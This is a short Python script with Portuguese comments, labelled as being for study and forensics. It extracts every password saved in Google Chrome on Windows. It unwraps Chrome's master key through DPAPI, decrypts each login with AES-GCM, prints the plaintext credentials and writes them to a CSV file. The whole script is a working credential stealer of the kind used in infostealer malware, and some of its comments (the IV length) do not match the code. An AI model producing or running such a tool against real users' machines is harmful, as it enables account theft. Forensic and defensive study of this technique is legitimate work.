# Escrito por Raphael Pina Viana
# Para fins de estudo e forense

import sqlite3
import os
import win32crypt
import base64
import json
from Crypto.Cipher import AES

#Caminho dos arquivos alvo
local_state_file_path = f"{os.environ.get('USERPROFILE')}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State" 
login_data_file_path = f"{os.environ.get('USERPROFILE')}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"

#chave do arquivo Local State
with open(local_state_file_path, "r") as file:
    json_data = json.load(file)

key_b64 = json_data['os_crypt']['encrypted_key']
key = base64.b64decode(key_b64)
key = key[5:] #remove a string DPAPI que indica a forma que a chave foi gerada (utilizando API do Windows)
key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

#decriptografando o banco de dados
db_con = sqlite3.connect(login_data_file_path)
db_cur = db_con.cursor()
db_cur.execute("SELECT action_url, username_value, password_value FROM logins")

arq = open("chrome_password_extrated.csv", "w")
arq.write(f"Action URL,Username,Password\n")

for index, data in enumerate(db_cur.fetchall()):
    url = data[0]
    username = data[1]
    password_value = data[2]

    # Dados criptografados que você quer descriptografar
    password_value = password_value[3:] #descarta v10 que indica parâmetros de criptografia do Chrome
    iv = password_value[:12] #primeiros 16 bytes são o IV
    encrypted_data = password_value[12:] #demais bytes são o CT

    # Descriptografar
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_data = cipher.decrypt(encrypted_data)
    password = decrypted_data[:-16].decode()
    tag = decrypted_data[16:]
    print(f"Action URL: {url}\nUsername: {username}\nPassword: {password}\n\n")
    arq.write(f"{url},{username},{password}\n")

arq.close()